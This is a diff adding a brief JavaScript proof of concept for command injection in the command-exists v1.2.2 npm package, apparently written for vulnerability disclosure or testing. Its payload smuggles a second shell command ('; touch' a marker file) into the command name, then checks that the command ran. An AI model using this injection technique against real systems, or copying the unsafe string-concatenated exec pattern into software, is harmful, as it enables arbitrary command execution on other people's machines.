@@ -1,0 +1,16 @@
+```javascript
+const commandExists = require("./node_modules/command-exists");
+
+// command-exists (v1.2.2) builds a shell command by string-concatenating the
+// user-supplied command name and passes it to child_process.exec(). The
+// exec() callback's "stdout" result is what signals success back to the
+// caller, but the injected shell metacharacters in the input execute
+// arbitrary commands before that callback ever runs.
+const marker = "/tmp/command_exists_poc_" + Date.now();
+const payload = "ls; touch " + marker; // breaks out of `command -v <name>`
+
+commandExists(payload, (err, exists) => {
+  console.log("exists:", exists);
+  console.log("arbitrary command executed:", require("fs").existsSync(marker));
+});
+```
